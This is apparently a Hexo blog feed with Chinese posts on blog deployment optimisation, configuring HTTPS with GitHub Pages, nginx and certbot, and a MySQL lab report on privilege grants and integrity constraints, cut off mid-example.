<p>将刚才生成公钥的内容复制进去（以 ssh-rsa 开头），并勾选 “Allow write access”。</p>
 <img data-src="/2023/04/03/works/how-i-built-the-blog/gen-key-4.png" class="">
</li>
</ol>
<p>配置完成后，每次将博客源码推送到 <code>main</code> 分支时，GitHub Actions 就会自动执行部署操作。</p>
<h2 id="访问优化">访问优化</h2>
<p>博客的内容会越来越多，大量的文章和图片难免会拖慢访问速度，hexo 及相关的插件也提供了一些优化的方法。</p>
<h3 id="hexo-all-minifier">hexo-all-minifier</h3>
<p>这个插件主要用于对博客中生成的 HTML、CSS、JS 和图片文件进行压缩，减少文件及仓库的体积，提高访问速度。</p>
<p>通过 npm 安装就可以使用：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-all-minifier --save</span><br></pre></td></tr></tbody></table></figure>
<p>然后在 <code>_config.yml</code> 中设置</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">all_minifier:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
<p>就可以开启插件。从实际使用体验来看，它自带的 js_concator、js_minifier、html_minifier、css_minifier 都可以保持开启，而在开发（撰写文章）时需要暂时关掉 <code>image_minifier</code>，因为压缩图片比较费时。</p>
<h3 id="cache">cache</h3>
<p>NexT 从 6.0.0 版本开始引入了内容生成缓存，顾名思义，在重复生成大量内容时这个选项可以节省下大量的时间。在 <code>_config.next.yml</code> 中完成这个配置即可：</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a href="https://hexo.io/zh-cn/docs/github-pages#%E9%A1%B9%E7%9B%AE%E9%A1%B5%E9%9D%A2">https://hexo.io/zh-cn/docs/github-pages# 项目页面</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p>查阅资料得知 waline 使用了 vercel 部署了一个 webapp，隔离了前端和存储，避免了安全问题 <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>运维</category>
        <category>技术</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>给自己的小破站上个 HTTPS</title>
    <url>/2023/04/21/works/working-with-https/</url>
    <content><![CDATA[<h2 id="为何配置-HTTPS">为何配置 HTTPS</h2>
<p>HTTPS 是 HTTP 的安全版，使用了 SSL/TLS 协议对通信进行加密，防止被窃听、篡改、伪造等，是现代网站必备的安全配置。现代的浏览器也偏向对那些没有使用 HTTPS 的网站标记为” 不安全 “，且 HTTPS 对于用户和网站开发者来说，都可以提供安全的保证，即使并不一定涉及到敏感数据的传输，也可以防止 ISP 注入广告，引起普通用户的反感。对于普通用户来说，是值得信赖的认证。</p>
<p>现如今，HTTPS 技术经过不断发展，已经变得相当方便，成本也越来越低，即使是个人用户，也可以至少申请一份一年的免费证书，通过一些配置安装到自己的网站上（虽然额度有限，当然一些云服务商肯定会让你去买正式证书）。</p>
<p>写这篇文章的时候（2023.5），我去看了一下<a href="https://buy.cloud.tencent.com/ssl">腾讯云 SSL 证书购买页面</a>，目前的定价对于个人用户来说，还是白嫖好了：（打折后 / 打折前，单位为元）</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">单域名证书</th>
<th style="text-align:center">泛域名证书</th>
<th style="text-align:center">多域名证书</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">个人（DV 型）</td>
<td style="text-align:center">532/560</td>
<td style="text-align:center">2147/2260</td>
<td style="text-align:center">912/960 (3 个域名)</td>
</tr>
<tr>
<td style="text-align:center"> 企业（OV 型）</td>
<td style="text-align:center">2470/2600</td>
<td style="text-align:center">5662/5960</td>
<td style="text-align:center">5282/5560 (3 个域名)</td>
</tr>
</tbody>
</table>
<h2 id="GitHub-Pages-启用-HTTPS">GitHub Pages 启用 HTTPS</h2>
<p>有几个域名是使用 GitHub Pages 托管的，其开启 HTTPS 的方式很容易。</p>
<ol>
<li>
<p>首先进入要配置的仓库，点击上方的 <code>Settings</code> 进入配置。</p>
</li>
<li>
<p>点击左侧的 <code>Pages</code>，在 <code>Build and deployment</code> 中选择要部署的分支，点击 <code>Save</code> 保存。</p>
</li>
<li>
<p>在 <code>Custom domain</code> 部分填写自己的域名（如果有），点击 <code>Save</code> 保存。GitHub 会立即进行一次检查。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2023/04/21/works/working-with-https/github-pages-1.png" class=""></div><div class="group-picture-column"><img data-src="/2023/04/21/works/working-with-https/github-pages-2.png" class=""></div></div></div>
 <div class="note "><p>如果使用的是 github.io 默认域名，则 HTTPS 会自动开启，无需手动配置。</p>
</div>
</li>
<li>
<p>一开始，这里一定是检查失败的，因为还没有按照 GitHub 的要求正确配置完毕。</p>
 <img data-src="/2023/04/21/works/working-with-https/github-pages-3.png" class="">
</li>
<li>
<p>我的域名是在 DNSPod 注册的，现在转到 DNSPod 控制台，添加一个 CNAME 记录，其主机记录填写自定义域名的主机部分，记录值填写 <code>&lt;你的github用户名&gt;.github.io</code>，TTL 保持默认，保存。</p>
 <img data-src="/2023/04/21/works/working-with-https/github-pages-4.png" class="">
</li>
<li>
<p>回到刚才的 Pages 设置页面，DNS 检查已经通过了，现在 GitHub 已经开始申请 TLS 证书了。</p>
 <img data-src="/2023/04/21/works/working-with-https/github-pages-5.png" class="">
</li>
<li>
<p>等待一段时间，证书申请完毕，就可以把下方的 <code>Enforce HTTPS</code> 勾选上了，这样站点就可以仅通过 HTTPS 访问了，更加安全。</p>
 <img data-src="/2023/04/21/works/working-with-https/github-pages-6.png" class="">
</li>
</ol>
<div class="note "><p>可以在项目设置中勾选 “Use your GitHub Pages website”，省去每次想不起域名的麻烦，也可以更方便地访问部署所在网页。<br>
<img data-src="/2023/04/21/works/working-with-https/gh-setting.png" class=""></p>
</div>
<h2 id="不怕麻烦的nginx手动配置过程">不怕麻烦的 nginx 手动配置过程</h2>
<div class="note "><p>不要忘记在安全组设置中放开 443 端口哦～</p>
</div>
<h3 id="申请证书">申请证书</h3>
<p>腾讯云对于每个个人用户都有 50 张免费证书的额度，对于我这种轻度开发用户来说，当然是一个域名一张证书就够用了，而且所需要的证书类型也是最简单的 DV 型，所以申请证书的过程也很简单。</p>
<img data-src="/2023/04/21/works/working-with-https/tcloud-1.png" class="" title="呃，有了之后要介绍的技术这些打叉的项算什么嘛">
<p>根据<a href="https://cloud.tencent.com/document/product/400/6814">文档</a>介绍和申请页所示，申请的证书是 TrustAsia 颁发的一年期证书，且同一域下最多有 20 张免费证书。这一步完成后，会获得颁发的证书，接下来需要将证书部署到相关服务上。</p>
<h3 id="部署证书">部署证书</h3>
<p>首先当然要从<a href="https://console.cloud.tencent.com/ssl">控制台</a>中下载证书。</p>
<p>nginx 中，SSL 的配置项主要在配置文件的 <code>server</code> 块中，为了支持 HTTPS，至少需要添加如下配置，其中 <code>DOMAIN</code> 是你申请证书的域名：</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">server</span> {</span><br><span class="line">     <span class="attribute">listen</span> <span class="number">443</span> ssl; </span><br><span class="line">     <span class="attribute">server_name</span> &lt;DOMAIN&gt;; </span><br><span class="line">     <span class="attribute">ssl_certificate</span> /path/to/&lt;DOMAIN&gt;_bundle.crt; </span><br><span class="line">     <span class="attribute">ssl_certificate_key</span> /path/to/&lt;DOMAIN&gt;.key; </span><br><span class="line">     <span class="attribute">ssl_session_timeout</span> <span class="number">5m</span>;</span><br><span class="line">     <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>; </span><br><span class="line">     <span class="attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; </span><br><span class="line">     <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line">     <span class="comment"># ... location 配置省略</span></span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure>
<p>将证书使用 WinSCP 等工具上传至服务器，然后在配置文件中填写正确的路径即可。</p>
<p>如果需要将 HTTP 请求重定向到 HTTPS 中，需要对配置的主机增加 80 端口监听，并将其转到 HTTPS 版本的链接上：</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">server</span> {</span><br><span class="line">	<span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span> &lt;DOMAIN&gt;;</span><br><span class="line">	<span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;  // 这行是关键</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="certbot-申请证书大作战">certbot 申请证书大作战</h2>
<p>之前一段时间一直在使用 certbot 的 dnspod 脚本来自动申请和续期证书，但是最近发现这个脚本突然不可用了，故趁这个机会总结一下手动申请证书的过程。</p>
<p>我的服务器操作系统是 ubuntu 18，使用 nginx 承担网站的日常工作。</p>
<div class="note "><p><a href="https://certbot.eff.org/instructions">certbot 官方网站</a>上分系统地提供了安装的方法，具体可以跟随那里操作。</p>
</div>
<h3 id="先安装">先安装</h3>
<ol>
<li>
<p>certbot 需要使用 snapd 安装，如果没有安装的话，需要使用以下命令安装：</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install snapd</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>保证 snapd 为最新版本</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo snap install core</span><br><span class="line">   sudo snap refresh core</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>卸载目前系统中残留的 certbot 组件</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get remove certbot</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>安装 certbot</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo snap install --classic certbot</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>创建软链接</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /snap/bin/certbot /usr/bin/certbot</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>验证安装</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo certbot --version</span><br></pre></td></tr></tbody></table></figure>
</li>
</ol>
<h3 id="撤销之前错误的证书">撤销之前错误的证书</h3>
<p>需要使用 <code>sudo certbot certificates</code> 查看当前已经申请的证书，如果有错误的证书，可以使用 <code>sudo certbot revoke --cert-path /etc/letsencrypt/live/xxx/fullchain.pem</code> 撤销。</p>
<h3 id="nginx-申请模式">nginx 申请模式</h3>
<ol>
<li>
<p>直接运行 <code>sudo certbot --nginx</code>，certbot 会自动扫描所有有效的 nginx 配置文件，列出所有可以申请证书的域名，选择需要申请的域名，输入序号，回车。或者，使用 <code>-d</code> 参数指定需要申请的域名，例如 <code>sudo certbot --nginx -d example.com</code>。</p>
 <img data-src="/2023/04/21/works/working-with-https/certbot-1.png" class="">
 <div class="note "><p>如果指定多次 <code>-d</code> 参数，则可以进行多域名申请。</p>
</div>
</li>
<li>
<p>等待脚本申请完成。</p>
 <div class="note warning no-icon"><img data-src="/2023/04/21/works/working-with-https/certbot-3.png" class="">
这种情况通常是之前配置过，没有清理干净，把报错提到的那行改成这个就行：
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br></pre></td></tr></tbody></table></figure>
<p>然后重新运行</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo certbot install --cert-name xxxx</span><br></pre></td></tr></tbody></table></figure>
<p>即可继续配置</p>
</div>
</li>
<li>
<p>然后可以使用 <code>sudo certbot certificates</code> 看到自己刚才申请的证书了，现在有 90 天有效期。</p>
 <img data-src="/2023/04/21/works/working-with-https/certbot-2.png" class="">
 <div class="note success"><p>有些博客会引导我们手动去配 cronjob 任务，但实际上，在刚才的部署过程中，certbot 会自动将更新命令加入到系统的 cronjob 中，在临期时自动续期证书。其位于 <code>/etc/cron.d/certbot</code> 中，源码如下</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">0 */12 * * * root <span class="built_in">test</span> -x /usr/bin/certbot -a \! -d /run/systemd/system &amp;&amp; perl -e <span class="string">'sleep int(rand(43200))'</span> &amp;&amp; certbot -q renew</span><br></pre></td></tr></tbody></table></figure></div>
</li>
<li>
<p>使用 <code>sudo certbot renew --dry-run</code> 测试一下续期命令是否可用。以后，可以使用不带 <code>--dry-run</code> 的命令来手动续期。</p>
</li>
<li>
<p>访问网站，发现已经可以使用 HTTPS 访问了。</p>
 <img data-src="/2023/04/21/works/working-with-https/certbot-4.png" class="">
</li>
</ol>
<h3 id="泛域名证书申请">泛域名证书申请</h3>
<blockquote>
<p>泛域名证书是指可以同时为多个子域名申请证书的证书，例如 <code>*.example.com</code> 可以为 <code>a.example.com</code>、<code>b.example.com</code> 等多个域名申请证书。</p>
</blockquote>
<p>上述的方法是针对单个域名的，虽然一次可以申请多个域名，但那些域名都是预先有配置的，如果以后想再添加的话需要手动加入配置，非常麻烦。</p>
<p>泛域名的证书需要 DNS 解析服务商支持自动验证，其需要通过官方插件来实现自动更新 DNS 以通过监测，很可惜，截至目前，并没有 dnspod 的插件，所以只能手动更新 DNS 了。</p>
<div class="note info"><p>在安装 certbot 插件（<code>sudo snap install certbot-dns-&lt;PLUGIN&gt;</code>）前，需要先运行如下命令</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo snap <span class="built_in">set</span> certbot trust-plugin-with-root=ok</span><br></pre></td></tr></tbody></table></figure>
<p>以保证其具有与 certbot snap 同样的 classic containment。</p>
</div>
<p>以下讲述手动更改配置的过程。</p>
<h4 id="手工通过验证">手工通过验证</h4>
<p>首先删除之前的证书</p>
<div class="note warning"><p>过期的证书不能撤销 <code>revoke</code>，只能删除 <code>delete</code></p>
</div>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo certbot delete --cert-name xxxx</span><br></pre></td></tr></tbody></table></figure>
<p>然后运行该命令</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo certbot certonly --preferred-challenges dns --manual -d *.&lt;要申请的域名&gt; --server https://acme-v02.api.letsencrypt.org/directory</span><br></pre></td></tr></tbody></table></figure>
<div class="note warning"><p>注意必须在 <code>--server</code> 中指定 <code>https://acme-v02.api.letsencrypt.org/directory</code> ，Let’s Encrypt V2 版本才支持泛域名解析。</p>
</div>
<p>然后会提示你添加一个 TXT 记录，访问你的 DNS 服务商后台，将给定的 TXT 记录添加，添加后等待一段时间，然后回车，就可以申请成功了。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2023/04/21/works/working-with-https/certbot-wildcard-1.png" class=""></div><div class="group-picture-column"><img data-src="/2023/04/21/works/working-with-https/certbot-wildcard-2.png" class=""></div></div></div>
<p>如果配置正确，certbot 会显示部署成功</p>
<img data-src="/2023/04/21/works/working-with-https/certbot-wildcard-3.png" class="">
<div class="note warning"><p>正如上个截图所说的那样，这种认证方式只有 90 天的有效期，且不能使用 <code>certbot renew</code> 的方式更新证书，所以需要手动续期，续期的时候，需要再次添加 TXT 记录。对于没有 API 支持的服务商来说，也只能这么做了。</p>
</div>
<p>完成以后，需要手动向配置文件增加相关配置。如果使用的是 nginx，则在站点的 nginx 配置文件中，将证书换为 Let’s Encrypt 提供的证书即可：</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line">server{</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/&lt;要申请的域名&gt;/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/&lt;要申请的域名&gt;/privkey.pem;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>过几分钟后查看，就可以看到已经成功申请了泛域名证书。</p>
<img data-src="/2023/04/21/works/working-with-https/certbot-wildcard-4.png" class="" title="注意CN字段部分">
]]></content>
      <categories>
        <category>运维</category>
        <category>技术</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>数据控制</title>
    <url>/2018/12/03/experiments/database/data-control/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<ol>
<li>熟悉通过 SQL 对数据库进行数据控制，包括安全性和完整性。</li>
<li>熟悉数据库的备份与恢复操作。</li>
</ol>
<span id="more"></span>
<h2 id="实验环境">实验环境</h2>
<p>本次实验使用 MySQL 软件，使用其图形化界面完成权限的全套管理工作。备份与还原数据部分使用命令行工具完成。</p>
<p>所用数据库内容为计算机产品数据库，内容同 <a href="/2018/11/17/experiments/database/interactive-sql/" title="交互式SQL">实验二</a>，实验环境与前两次实验完全相同。</p>
<h2 id="实验内容和完成情况">实验内容和完成情况</h2>
<h3 id="实验准备">实验准备</h3>
<ol>
<li>
<p>从 MySQL 界面中选择 root 用户登录</p>
 <img data-src="/2018/12/03/experiments/database/data-control/preparation_create_user.png" class="">
</li>
<li>
<p>在左侧管理栏中点击 <code>Administration</code>，然后点击 <code>Users and privileges</code>，在其中添加用户。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/preparation_create_user_2.png" class="">
<p>或者在命令行输入 <code>create user</code> 命令创建用户。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/preparation_create_user_3.png" class="">
</li>
</ol>
<div class="note info"><h4 id="将创建以下用户">将创建以下用户</h4>
<ul>
<li>2017522133（root + 所有权限）</li>
<li>U1~U7（创建用户时默认对其赋予 <code>Connect</code> 权限）</li>
</ul>
</div>
<h3 id="数据的安全性">数据的安全性</h3>
<ol>
<li>完成 DBA 方面的授权。包括：
<ul>
<li>将查询 PC 表的权利授给用户 U1；  <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span> <span class="keyword">on</span> <span class="keyword">table</span> PC <span class="keyword">to</span> U1;</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>把对 PC 表和 Laptop 表的全部操作权限赋予用户 U2 和 U3；  <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="keyword">table</span> PC <span class="keyword">to</span> U2;</span><br><span class="line">      <span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="keyword">table</span> Laptop <span class="keyword">to</span> U2;</span><br><span class="line">      <span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="keyword">table</span> PC <span class="keyword">to</span> U3;</span><br><span class="line">      <span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="keyword">table</span> Laptop <span class="keyword">to</span> U3;</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>把对 Product 表的查询权限赋予全体用户；  <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span> <span class="keyword">on</span> <span class="keyword">table</span> Product <span class="keyword">to</span> public;</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>把查询 Laptop 表和修改笔记本价格的权限赋予用户 U4；  <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">update</span>(price),<span class="keyword">select</span> <span class="keyword">on</span> <span class="keyword">table</span> Laptop <span class="keyword">to</span> U4;</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>把对表 Product 的 INSERT 权限授予 U5 用户，并允许将此权限再授予其他用户。  <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">insert</span> <span class="keyword">on</span> <span class="keyword">table</span> Product <span class="keyword">to</span> U5 <span class="keyword">with</span> <span class="keyword">grant</span> option;</span><br></pre></td></tr></tbody></table></figure>
</li>
</ul>
</li>
<li>U5 将他获得的 <code>INSERT</code> 权限转给 U6。
<ol>
<li>以 U5 身份登录数据库。 <img data-src="/2018/12/03/experiments/database/data-control/grant_4.png" class="">
</li>
<li>命令窗口中输入 <code>grant insert on table Product to U6;</code>。 <img data-src="/2018/12/03/experiments/database/data-control/grant_5.png" class="">
</li>
</ol>
</li>
<li>U6 试图将 Product 表的 Insert 权限传播给 U7。
<ol>
<li>以 U6 身份登录数据库。 <img data-src="/2018/12/03/experiments/database/data-control/grant_6.png" class="">
</li>
<li>命令窗口中输入 <code>grant insert on table Product to U7;</code>。 <img data-src="/2018/12/03/experiments/database/data-control/grant_7.png" class="">
</li>
<li>运行失败，出现 1142 错误。其意义为：”U6 不可使用 <code>GRANT</code> 命令传播 product 表的 <code>INSERT</code> 权限”。 <img data-src="/2018/12/03/experiments/database/data-control/grant_8.png" class="">
</li>
</ol>
</li>
<li>收回用户 U3 对于 PC 表的查询权限。
<ol>
<li>以 2017522133 用户身份登录数据库，输入 <code>revoke select on table PC from U3;</code>。 <img data-src="/2018/12/03/experiments/database/data-control/revoke_1.png" class="">
</li>
<li>以 U3 用户身份登录，试图在 PC 表中进行 <code>SELECT</code> 操作。 <img data-src="/2018/12/03/experiments/database/data-control/revoke_2.png" class="">
</li>
<li>操作失败，显示 1142 错误 “U3 对于 PC 表的 <code>SELECT</code> 操作被禁止”。 <img data-src="/2018/12/03/experiments/database/data-control/revoke_3.png" class="">
</li>
</ol>
</li>
<li>收回用户 U5 对于 Product 表的 <code>INSERT</code> 权限。
<ol>
<li>
<p>以 root 身份登录，输入 <code>revoke insert on table Product from U5;</code>。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/revoke_4.png" class="">
</li>
<li>
<p>以 U5 身份登录，试图进行插入操作，结果操作失败。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/revoke_5.png" class="">
 <img data-src="/2018/12/03/experiments/database/data-control/revoke_6.png" class="">
</li>
<li>
<p>以 U6 身份登录，试图进行插入操作，结果操作成功。说明 MySQL 对于 <code>REVOKE</code> 语句的默认值为 <code>RESTRICT</code>。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/revoke_7.png" class="">
<p>注意 U6 没有查询权限！需要登录 root 用户才能查询到下图数据。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/revoke_8.png" class="">
</li>
</ol>
</li>
</ol>
<h3 id="数据的完整性">数据的完整性</h3>
<p>已知三张表格的 DDL 语言如下：</p>
<div class="tabs" id="ddl"><ul class="nav-tabs"><li class="tab active"><a href="#ddl-1">product</a></li><li class="tab"><a href="#ddl-2">laptop</a></li><li class="tab"><a href="#ddl-3">pc</a></li></ul><div class="tab-content"><div class="tab-pane active" id="ddl-1"><img data-src="/2018/12/03/experiments/database/data-control/product_define.png" class=""></div><div class="tab-pane" id="ddl-2"><img data-src="/2018/12/03/experiments/database/data-control/laptop_define.png" class=""></div><div class="tab-pane" id="ddl-3"><img data-src="/2018/12/03/experiments/database/data-control/pc_define.png" class=""></div></div></div>
<ol>
<li>[实体完整性 I] 在对 pc 表添加数据时没有指定 model。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/5.1.1.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/5.1.1result.png" class=""></div></div></div>
</li>
<li>[实体完整性 II] 在对 product 表添加数据时没有指定 model 和 maker（这两个字段为 product 表主码）。<br>
先完成表级设定。 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `computer_products`.`product` </span><br><span class="line">CHANGE <span class="keyword">COLUMN</span> `maker` `maker` <span class="type">CHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY (`model`, `maker`);</span><br></pre></td></tr></tbody></table></figure>
 <div class="note warning"><p>要先 drop 掉当前的 primary key 再添加，不然会出现重复定义错误。<br>
<img data-src="/2018/12/03/experiments/database/data-control/5.1.1error.png" class=""></p>
</div>
然后试图添加数据，失败。错误信息与前述相同。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/5.1.2.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/5.1.2result.png" class=""></div></div></div>
</li>
<li>[参照完整性 I] 试图从 product 表中删除数据或在 laptop 表中插入数据，参照完整性定义为 <code>RESTRICT</code>。 <img data-src="/2018/12/03/experiments/database/data-control/laptop.png" class="">
 <div class="tabs" id="product-laptop"><ul class="nav-tabs"><li class="tab active"><a href="#product-laptop-1">子表插入数据</a></li><li class="tab"><a href="#product-laptop-2">父表删除数据</a></li></ul><div class="tab-content"><div class="tab-pane active" id="product-laptop-1"><img data-src="/2018/12/03/experiments/database/data-control/ref_1.png" class="">
<img data-src="/2018/12/03/experiments/database/data-control/ref_1_error.png" class="">
插入操作错误信息：
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Error Code: 1452. Cannot add or update a child row: a foreign key constraint fails (`computer_products`.`laptop`, CONSTRAINT `laptop_ibfk_1` FOREIGN KEY (`model`) REFERENCES `product` (`model`))</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="product-laptop-2"><img data-src="/2018/12/03/experiments/database/data-control/ref_2.png" class="">
<img data-src="/2018/12/03/experiments/database/data-control/ref_2_error.png" class="">
删除操作错误信息：
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Error Code: 1451. Cannot delete or update a parent row: a foreign key constraint fails (`computer_products`.`laptop`, CONSTRAINT `laptop_ibfk_1` FOREIGN KEY (`model`) REFERENCES `product` (`model`))</span><br></pre></td></tr></tbody></table></figure></div></div></div>
</li>
<li>[参照完整性 II] 试图从 product 表中删除数据或在 pc 表中插入数据，参照完整性定义为 <code>CASCADE</code>。 <img data-src="/2018/12/03/experiments/database/data-control/pc.png" class="">
 <div class="tabs" id="product-pc"><ul class="nav-tabs"><li class="tab active"><a href="#product-pc-1">子表插入数据</a></li><li class="tab"><a href="#product-pc-2">父表删除数据</a></li></ul><div class="tab-content"><div class="tab-pane active" id="product-pc-1"><img data-src="/2018/12/03/experiments/database/data-control/ref_3.png" class="">
<img data-src="/2018/12/03/experiments/database/data-control/ref_3_error.png" class="">
插入操作错误信息：
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Error Code: 1452. Cannot add or update a child row: a foreign key constraint fails (`computer_products`.`pc`, CONSTRAINT `pc_ibfk_1` FOREIGN KEY (`model`) REFERENCES `product` (`model`) ON DELETE CASCADE ON UPDATE CASCADE)</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="product-pc-2"><img data-src="/2018/12/03/experiments/database/data-control/ref_4.png" class="">
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/ref_4_result1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/ref_4_result2.png" class=""></div></div></div>
可以删除，且 pc 表中的相关数据也被直接删除。</div></div></div>
</li>
<li>[参照完整性 III] 试图从 product 表中删除数据或在 laptop 表中插入数据，参照完整性定义为 <code>SET NULL</code>。
<ul>
<li>本例无法完成，因为 product 表的主码和 laptop 表的主码一致且不能为空。</li>
</ul>
</li>
<li>[用户定义完整性] Product 表的形式定义语言如下 <img data-src="/2018/12/03/experiments/database/data-control/ref_5.png" class="">
<ol>
<li>
<p>Model 被设置为列值唯一，不能再插入相同的值。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/ref_5_2.png" class="">
 <img data-src="/2018/12/03/experiments/database/data-control/ref_5_error.png" class="">
</li>
<li>
<p>(<code>CHECK</code> 短语) 临时表 Computers 定义如下</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">create</span> <span class="keyword">table</span> Computers</span><br><span class="line">(maker <span class="type">char</span>(<span class="number">2</span>) <span class="keyword">check</span>(maker <span class="keyword">in</span>(<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>)), <span class="operator">/</span><span class="operator">/</span>厂商只有A、B、C三家</span><br><span class="line">model <span class="type">int</span>(<span class="number">4</span>),</span><br><span class="line">price <span class="type">int</span>(<span class="number">5</span>) <span class="keyword">check</span>(price<span class="operator">&gt;=</span><span class="number">1000</span> <span class="keyword">and</span> price<span class="operator">&lt;=</span><span class="number">10000</span>), <span class="operator">/</span><span class="operator">/</span>所有电脑的价格在<span class="number">1000</span>元到<span class="number">10000</span>元之间</span><br><span class="line"><span class="keyword">primary</span> key(model),</span><br><span class="line"><span class="keyword">check</span> (maker<span class="operator">=</span><span class="string">'B'</span> <span class="keyword">or</span> price<span class="operator">&lt;=</span><span class="number">5000</span>)   <span class="operator">/</span><span 